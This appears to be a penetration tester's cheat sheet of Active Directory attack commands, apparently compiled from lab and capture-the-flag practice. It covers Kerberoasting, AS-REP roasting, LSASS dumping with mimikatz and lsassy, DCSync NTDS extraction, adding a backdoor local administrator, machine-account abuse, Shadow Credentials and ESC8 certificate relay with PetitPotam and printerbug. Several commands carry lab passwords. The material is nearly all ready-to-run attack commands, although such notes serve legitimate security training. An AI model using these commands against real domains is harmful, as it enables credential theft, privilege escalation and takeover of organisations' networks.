
## Getting TGT

```bash
impacket-getTGT checkpoint.htb/alex.turner:'Checkpoint2024!'
export KRB5CCNAME=alex.turner.ccache
klist
```


## Pivoting

```bash
# Terminal 1 - Ligolo server
sudo ./proxy -selfcert
# In ligolo console:
ifcreate --name ligolo
route_add --name ligolo --route 192.168.2.0/24
```

## Misc

```bash
sshpass -p 'Pssw0rd' ssh 'user$'@sql01.abc.local

nxc smb $target --generate-hosts-file /tmp/hosts.tmp && sudo tee -a /etc/hosts < /tmp/hosts.tmp && rm /tmp/hosts.tmp

net user bob P@ssw0rd /add && net localgroup Administrators bob /add

impacket-addcomputer 'dc'/'user':'pass' -computer-name 'GATARI' -computer-pass 'P@ssw0rd'

# trust enum
nxc ldap dc -u 'user' -p 'pass' --query "(objectClass=trustedDomain)" "cn flatName trustDirection trustType"

# powershell history path
C:\Users\Name\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# mimikatz
.\mimikatz.exe "sekurlsa::logonpasswords" "exit"
# dumping lsass using nxc
nxc smb srv01.backward.rv -u 'gatari$' -p 'P@ssw0rd' -M lsassy
```

## Machine Account

```bash
# Maq
nxc ldap domain -u 'user' -p 'pass' -M maq

# creating machine account
nxc smb dc -u 'user' -p 'pass' -M add-computer -o NAME="machine1$" PASSWORD='P@ssw0rd'


# Cross domain
nxc ldap dc02 -u 'user' -H 'hash' -d 'domain1' -M maq

nxc smb dc02 -u 'natasha.lim' -H 'hash' -d 'domain1' -M add-computer -o NAME="gatari$" PASSWORD='P@ssw0rd'
```
## DNS Enum

```bash
adidnsdump -u 'domain\user' -p 'pass' dc.abc.local 
```

## Kerberoasting

```bash
nxc ldap <domain> -u 'user' -p 'pass' --query "(&(objectClass=user)(servicePrincipalName=*))" "samAccountName servicePrincipalName"

nxc ldap <domain> -u 'user' -p 'pass' --kerberoasting service_tickets.txt

impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev

# swp file recovery
vim -r .file.swp
```

## AS-REP Roasting
`
```bash
nxc ldap dc -u 'user' -p 'pass' --asreproast 'asrep.out'
```

## BloodyAD

```bash
# enumerate writable obj
bloodyAD --host 'dc.abc.local' -u 'user' -p ':hash' get writable

# adding account to group
bloodyAD --host 'dc' -u 'user' -p 'pass' add groupMember 'developers' 'machine1$'
# cross domain (generic all)
bloodyAD --host 'dc02.abc' -u 'user' -p ':hash' -d 'domain1' add groupMember 'sysadmins' 'gatari$'
```

## Bloodhound

```bash
bloodhound-ce-python -u 'user' -p 'pass' -d 'domain' -c 'All' -ns '10.5.10.10' --zip

# cross forest enum
bloodhound-ce-python -u 'user@domain1' -p 'pass' -d 'domain2' -c 'All' -ns '10.5.10.12' --zip
```

## DCSync

```bash
nxc smb dc -u 'user' -H 'hash' --ntds --user 'Administrator'
```

# Privilege Escalation

## Shadow Credential

**Shadow Credentials** abuse the `msDS-KeyCredentialLink` attribute to add an attacker-controlled public key for PKINIT authentication.

In BloodHound, `AddKeyCredentialLink` means a user can write to that attribute and potentially take over the target account.

```bash
# The command below generates an `X.509 certificate` and writes the `public key` to the victim user's `msDS-KeyCredentialLink` attribute
pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add

# Request TGT
python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
```

## ESC8

```bash
impacket-ntlmrelayx -t http://10.0.30.19/certsrv/certfnsh.asp \ -smb2support --adcs --template DomainController

# Two options (PetitPotam or printerbug)
# PetitPotam
python3 PetitPotam.py -u jtrueblood -p 'blood_brothers' \ -d shadow.gate <YOUR_IP> 10.0.30.19

# printerbug - https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
```

```bash
# Two options
# certipy
certipy auth -pfx 'dc.pfx' -dc-ip '10.0.0.100'

# pkinit
[ -d PKINITtools ] || git clone https://github.com/dirkjanm/PKINITtools.git; \
cd PKINITtools && \
uv venv .venv && \
source .venv/bin/activate && \
uv pip install -r requirements.txt && \
uv pip install -I git+https://github.com/wbond/oscrypto.git && \
uv run python gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
```